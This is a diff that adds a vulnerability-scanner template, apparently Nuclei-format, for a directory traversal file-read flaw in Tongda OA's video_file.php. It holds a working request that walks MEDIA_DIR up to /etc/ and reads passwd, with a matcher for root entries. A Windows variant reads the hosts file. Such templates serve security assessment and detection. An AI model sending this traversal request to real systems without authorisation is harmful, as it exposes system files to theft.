@@ -1,0 +1,27 @@
+id: scopesentry-tongda-videofile-fileread
+
+info:
+  name: Tongda OA video_file.php Directory Traversal File Read
+  author: scopesentry
+  severity: high
+  description: |
+    通达 OA /general/mytable/intel_view/video_file.php 的 MEDIA_DIR 与 MEDIA_NAME 可拼接穿越。
+    判据：读到 /etc/passwd 原文（root:.*:0:0:）。Windows 目标把 MEDIA_DIR 指到 system32 的 etc 目录读 hosts。
+  tags: tongda,oa,lfi,file-read
+  metadata:
+    verified: false
+    max-request: 1
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../../../../../../etc/&MEDIA_NAME=passwd'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+      - type: status
+        status:
+          - 200
